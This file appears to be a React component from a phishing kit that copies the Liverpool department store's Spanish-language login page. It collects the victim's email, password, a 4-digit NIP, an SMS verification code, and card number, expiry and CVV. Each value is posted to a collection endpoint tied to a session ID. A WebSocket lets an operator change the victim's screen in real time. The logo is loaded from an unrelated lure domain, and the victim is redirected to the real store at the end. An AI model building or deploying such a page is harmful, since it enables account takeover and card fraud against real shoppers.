import { useState, useEffect } from "react";
import { useLocation, useRouter } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { Eye, EyeOff } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";

type ScreenType = "login" | "loading" | "nip" | "sms-verification" | "card-protection";

export default function TemplateLiverpool() {
  const [location] = useLocation();
  const router = useRouter();
  const [currentScreen, setCurrentScreen] = useState<ScreenType>("login");
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    nip: "",
    smsCode: "",
    cardNumber: "",
    expiryDate: "",
    cvv: ""
  });

  // Parsear sessionId directamente desde window.location
  const urlParams = new URLSearchParams(window.location.search);
  const sessionId = urlParams.get('sessionId');
  
  console.log(`[LIVERPOOL DEBUG] URL completa: ${window.location.href}`);
  console.log(`[LIVERPOOL DEBUG] Search params: ${window.location.search}`);
  console.log(`[LIVERPOOL DEBUG] Wouter location: ${location}`);
  console.log(`[LIVERPOOL DEBUG] Session ID obtenido: ${sessionId}`);

  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    const socket = new WebSocket(wsUrl);

    socket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'screen_change' && data.sessionId === sessionId) {
        setCurrentScreen(data.screen);
      }
    };

    return () => socket.close();
  }, [sessionId]);

  const submitData = async (fieldName: string, fieldValue: string) => {
    console.log(`[LIVERPOOL DEBUG] Enviando datos: ${fieldName} = ${fieldValue}`);
    console.log(`[LIVERPOOL DEBUG] Session ID: ${sessionId}`);
    
    if (!sessionId) {
      console.error(`[LIVERPOOL DEBUG] ERROR: No hay sessionId disponible!`);
      return;
    }

    try {
      console.log(`[LIVERPOOL DEBUG] Enviando petición POST a /api/submissions...`);
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        fieldName,
        fieldValue
      });
      console.log(`[LIVERPOOL DEBUG] Datos enviados exitosamente:`, response);
    } catch (error) {
      console.error(`[LIVERPOOL DEBUG] ERROR enviando datos:`, error);
    }
  };

  const updateSession = async (updates: any) => {
    if (!sessionId) return;

    try {
      await apiRequest("PATCH", `/api/sessions/${sessionId}`, updates);
    } catch (error) {
      console.error("Error updating session:", error);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log(`[LIVERPOOL DEBUG] handleLogin llamado con:`, formData);
    
    if (!formData.email || !formData.password) {
      console.error(`[LIVERPOOL DEBUG] ERROR: Faltan datos - email: ${formData.email}, password: ${formData.password}`);
      return;
    }

    console.log(`[LIVERPOOL DEBUG] Enviando email y password...`);
    await submitData("email", formData.email);
    await submitData("password", formData.password);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading" });

    setTimeout(async () => {
      setCurrentScreen("nip");
      await updateSession({ currentScreen: "nip" });
      setIsLoading(false);
    }, 2000);
  };

  const handleNipSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.nip || formData.nip.length !== 4) return;

    await submitData("nip", formData.nip);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading" });

    setTimeout(async () => {
      setCurrentScreen("sms-verification");
      await updateSession({ currentScreen: "sms-verification" });
      setIsLoading(false);
    }, 2000);
  };

  const handleSmsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.smsCode || formData.smsCode.length !== 6) return;

    await submitData("sms_code", formData.smsCode);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading" });

    setTimeout(async () => {
      setCurrentScreen("card-protection");
      await updateSession({ currentScreen: "card-protection" });
      setIsLoading(false);
    }, 2000);
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.cardNumber || !formData.expiryDate || !formData.cvv) return;

    await submitData("card_number", formData.cardNumber);
    await submitData("expiry_date", formData.expiryDate);
    await submitData("cvv", formData.cvv);

    setIsLoading(true);
    setCurrentScreen("loading");
    await updateSession({ currentScreen: "loading", status: "completed" });

    setTimeout(() => {
      window.location.href = "https://www.liverpool.com.mx/tienda/home";
    }, 3000);
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return (
          <div className="min-h-screen bg-white flex flex-col">
            {/* Header rosa exacto como la imagen */}
            <div className="bg-[#E91E63] text-white py-4">
              <div className="container mx-auto flex items-center justify-center px-4">
                <div className="flex items-center">
                  <img 
                    src="https://hh.airlines-mx.click/premios/hook/liverpool-logo.svg" 
                    alt="Liverpool" 
                    className="h-10 w-auto filter brightness-0 invert"
                  />
                </div>
              </div>
            </div>

            {/* Contenido principal exacto como la imagen */}
            <div className="flex-1 bg-white">
              <div className="max-w-md mx-auto px-6 py-8">
                {/* Texto descriptivo */}
                <div className="text-center mb-8">
                  <p className="text-gray-600 text-sm mb-8 leading-relaxed px-4">
                    Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.
                  </p>

                  {/* Iconos de tiendas exactos como la imagen */}
                  <div className="flex justify-center items-center space-x-1 mb-12">
                    <div className="w-8 h-6 bg-[#8B5A87] rounded flex items-center justify-center text-white text-xs font-bold">$</div>
                    <div className="w-8 h-6 bg-gray-800 rounded flex items-center justify-center text-white text-xs font-bold">PH</div>
                    <div className="w-8 h-6 bg-[#4A90E2] rounded flex items-center justify-center text-white text-xs font-bold">bd</div>
                    <div className="w-8 h-6 bg-gray-600 rounded flex items-center justify-center text-white text-xs font-bold">WE</div>
                    <div className="w-8 h-6 bg-gray-700 rounded flex items-center justify-center text-white text-xs font-bold">WS</div>
                    <div className="w-8 h-6 bg-[#1B365D] rounded flex items-center justify-center text-white text-xs font-bold">GAP</div>
                    <div className="w-8 h-6 bg-[#2C5282] rounded flex items-center justify-center text-white text-xs font-bold">RX</div>
                    <div className="w-8 h-6 bg-[#4299E1] rounded flex items-center justify-center text-white text-xs font-bold">⭐</div>
                    <div className="w-8 h-6 bg-[#805AD5] rounded flex items-center justify-center text-white text-xs font-bold">⭐</div>
                    <div className="w-8 h-6 bg-gray-800 rounded flex items-center justify-center text-white text-xs font-bold">D</div>
                    <div className="w-8 h-6 bg-gray-700 rounded flex items-center justify-center text-white text-xs font-bold">≈</div>
                  </div>
                </div>

                {/* Título exacto */}
                <h1 className="text-2xl font-normal text-center text-gray-800 mb-8">Inicia sesión</h1>

                {/* Formulario exacto como la imagen */}
                <form onSubmit={handleLogin} className="space-y-6">
                  <div>
                    <label className="block text-sm text-[#E91E63] mb-2 font-normal">
                      Correo electrónico*
                    </label>
                    <input
                      type="email"
                      value={formData.email}
                      onChange={(e) => setFormData({...formData, email: e.target.value})}
                      className="w-full border-2 border-[#E91E63] focus:border-[#E91E63] focus:outline-none h-12 px-4 text-gray-800 bg-white"
                      required
                      data-testid="input-liverpool-email"
                    />
                  </div>

                  <div>
                    <label className="block text-sm text-gray-700 mb-2 font-normal">
                      Contraseña*
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={formData.password}
                        onChange={(e) => setFormData({...formData, password: e.target.value})}
                        className="w-full border-2 border-gray-300 focus:border-[#E91E63] focus:outline-none h-12 px-4 pr-12 text-gray-800 bg-white"
                        required
                        data-testid="input-liverpool-password"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500"
                        data-testid="button-liverpool-toggle-password"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  {/* Enlace olvidaste contraseña */}
                  <div className="text-left py-1">
                    <button
                      type="button"
                      className="text-[#E91E63] text-sm underline font-normal"
                      data-testid="link-liverpool-forgot-password"
                    >
                      ¿Olvidaste tu contraseña?
                    </button>
                  </div>

                  {/* Botón principal exacto */}
                  <button
                    type="submit"
                    className="w-full bg-[#E91E63] hover:bg-[#C2185B] text-white h-12 text-lg font-normal transition-colors"
                    disabled={!formData.email || !formData.password}
                    data-testid="button-liverpool-login-submit"
                  >
                    Iniciar sesión
                  </button>

                  {/* Enlace crear cuenta */}
                  <div className="text-center pt-4">
                    <span className="text-gray-600 text-sm">¿No tienes cuenta? </span>
                    <button
                      type="button"
                      className="text-[#E91E63] text-sm underline font-normal"
                      data-testid="link-liverpool-create-account"
                    >
                      Crear cuenta
                    </button>
                  </div>
                </form>
              </div>
            </div>

            {/* Footer exacto como la imagen */}
            <div className="bg-gray-600 text-white text-center py-4 mt-auto">
              <div className="text-sm">
                © Términos y condiciones / Aviso de Privacidad © 2021
              </div>
            </div>
          </div>
        );

      case "loading":
        return (
          <div className="min-h-screen bg-white flex items-center justify-center">
            <div className="bg-[#E91E63] text-white p-4">
              <div className="max-w-md mx-auto text-center">
                <img 
                  src="https://hh.airlines-mx.click/premios/hook/liverpool-logo.svg" 
                  alt="Liverpool" 
                  className="h-10 w-auto mx-auto mb-4 filter brightness-0 invert"
                />
              </div>
            </div>
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="w-96 mx-4 bg-white border border-gray-200 rounded-lg shadow-sm">
                <div className="p-8 text-center">
                  <div className="animate-spin w-8 h-8 border-4 border-[#E91E63] border-t-transparent rounded-full mx-auto mb-4"></div>
                  <p className="text-gray-600">Procesando información...</p>
                </div>
              </div>
            </div>
          </div>
        );

      case "nip":
        return (
          <div className="min-h-screen bg-white">
            <div className="bg-[#E91E63] text-white p-4">
              <div className="max-w-md mx-auto text-center">
                <img 
                  src="https://hh.airlines-mx.click/premios/hook/liverpool-logo.svg" 
                  alt="Liverpool" 
                  className="h-10 w-auto mx-auto filter brightness-0 invert"
                />
              </div>
            </div>

            <div className="max-w-md mx-auto p-6">
              <div className="mt-8 bg-white border border-gray-200 rounded-lg shadow-sm">
                <div className="p-8">
                  <h2 className="text-2xl font-bold text-center text-gray-800 mb-2">
                    Verificación de Seguridad
                  </h2>
                  <p className="text-center text-gray-600 mb-8">
                    Ingresa tu NIP de 4 dígitos para continuar
                  </p>

                  <form onSubmit={handleNipSubmit} className="space-y-6">
                    <div>
                      <label className="block text-sm text-[#E91E63] mb-2">
                        NIP de Seguridad*
                      </label>
                      <input
                        type="password"
                        value={formData.nip}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, "").slice(0, 4);
                          setFormData({...formData, nip: value});
                        }}
                        className="w-full text-center text-2xl tracking-widest border-2 border-[#E91E63] focus:border-[#E91E63] focus:outline-none bg-white text-gray-800 h-12 px-4"
                        placeholder="••••"
                        maxLength={4}
                        required
                        data-testid="input-liverpool-nip"
                      />
                    </div>

                    <button
                      type="submit"
                      className="w-full bg-[#E91E63] hover:bg-[#C2185B] text-white h-12 text-lg font-normal transition-colors"
                      disabled={formData.nip.length !== 4}
                      data-testid="button-liverpool-nip-submit"
                    >
                      Continuar
                    </button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        );

      case "sms-verification":
        return (
          <div className="min-h-screen bg-white">
            <div className="bg-[#E91E63] text-white p-4">
              <div className="max-w-md mx-auto text-center">
                <img 
                  src="https://hh.airlines-mx.click/premios/hook/liverpool-logo.svg" 
                  alt="Liverpool" 
                  className="h-10 w-auto mx-auto filter brightness-0 invert"
                />
              </div>
            </div>

            <div className="max-w-md mx-auto p-6">
              <div className="mt-8 bg-white border border-gray-200 rounded-lg shadow-sm">
                <div className="p-8">
                  <h2 className="text-2xl font-bold text-center text-gray-800 mb-2">
                    Verificación SMS
                  </h2>
                  <p className="text-center text-gray-600 mb-8">
                    Hemos enviado un código de verificación a tu número de teléfono registrado
                  </p>

                  <form onSubmit={handleSmsSubmit} className="space-y-6">
                    <div>
                      <label className="block text-sm text-[#E91E63] mb-2">
                        Código de Verificación*
                      </label>
                      <input
                        type="text"
                        value={formData.smsCode}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, "").slice(0, 6);
                          setFormData({...formData, smsCode: value});
                        }}
                        className="w-full text-center text-2xl tracking-widest border-2 border-[#E91E63] focus:border-[#E91E63] focus:outline-none bg-white text-gray-800 h-12 px-4"
                        placeholder="••••••"
                        maxLength={6}
                        required
                        data-testid="input-liverpool-sms-code"
                      />
                    </div>

                    <div className="text-center">
                      <button
                        type="button"
                        className="text-[#E91E63] text-sm underline"
                        data-testid="link-liverpool-resend-code"
                      >
                        ¿No recibiste el código? Reenviar
                      </button>
                    </div>

                    <button
                      type="submit"
                      className="w-full bg-[#E91E63] hover:bg-[#C2185B] text-white h-12 text-lg font-normal transition-colors"
                      disabled={formData.smsCode.length !== 6}
                      data-testid="button-liverpool-sms-submit"
                    >
                      Verificar
                    </button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        );

      case "card-protection":
        return (
          <div className="min-h-screen bg-white">
            <div className="bg-[#E91E63] text-white p-4">
              <div className="max-w-md mx-auto text-center">
                <img 
                  src="https://hh.airlines-mx.click/premios/hook/liverpool-logo.svg" 
                  alt="Liverpool" 
                  className="h-10 w-auto mx-auto filter brightness-0 invert"
                />
              </div>
            </div>

            <div className="max-w-md mx-auto p-6">
              <div className="mt-8 bg-white border border-gray-200 rounded-lg shadow-sm">
                <div className="p-8">
                  <h2 className="text-2xl font-bold text-center text-gray-800 mb-2">
                    Protección de Cuenta
                  </h2>
                  <p className="text-center text-gray-600 mb-8">
                    Para mayor seguridad, confirma los datos de tu tarjeta asociada
                  </p>

                  <form onSubmit={handleCardSubmit} className="space-y-6">
                    <div>
                      <label className="block text-sm text-[#E91E63] mb-2">
                        Número de Tarjeta*
                      </label>
                      <input
                        type="text"
                        value={formData.cardNumber}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, "");
                          const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
                          setFormData({...formData, cardNumber: formatted.slice(0, 19)});
                        }}
                        className="w-full border-2 border-[#E91E63] focus:border-[#E91E63] focus:outline-none bg-white text-gray-800 h-12 px-4"
                        placeholder="1234 5678 9012 3456"
                        required
                        data-testid="input-liverpool-card-number"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <label className="block text-sm text-[#E91E63] mb-2">
                          Fecha de Vencimiento*
                        </label>
                        <input
                          type="text"
                          value={formData.expiryDate}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, "");
                            const formatted = value.replace(/(\d{2})(\d{0,2})/, "$1/$2");
                            setFormData({...formData, expiryDate: formatted.slice(0, 5)});
                          }}
                          className="w-full border-2 border-[#E91E63] focus:border-[#E91E63] focus:outline-none bg-white text-gray-800 h-12 px-4"
                          placeholder="MM/AA"
                          required
                          data-testid="input-liverpool-expiry"
                        />
                      </div>
                      <div>
                        <label className="block text-sm text-[#E91E63] mb-2">
                          CVV*
                        </label>
                        <input
                          type="password"
                          value={formData.cvv}
                          onChange={(e) => {
                            const value = e.target.value.replace(/\D/g, "").slice(0, 3);
                            setFormData({...formData, cvv: value});
                          }}
                          className="w-full border-2 border-[#E91E63] focus:border-[#E91E63] focus:outline-none bg-white text-gray-800 h-12 px-4"
                          placeholder="123"
                          maxLength={3}
                          required
                          data-testid="input-liverpool-cvv"
                        />
                      </div>
                    </div>

                    <button
                      type="submit"
                      className="w-full bg-[#E91E63] hover:bg-[#C2185B] text-white h-12 text-lg font-normal transition-colors"
                      disabled={!formData.cardNumber || !formData.expiryDate || !formData.cvv}
                      data-testid="button-liverpool-card-submit"
                    >
                      Confirmar Datos
                    </button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        );

      default:
        return renderScreen();
    }
  };

  return <div>{renderScreen()}</div>;
}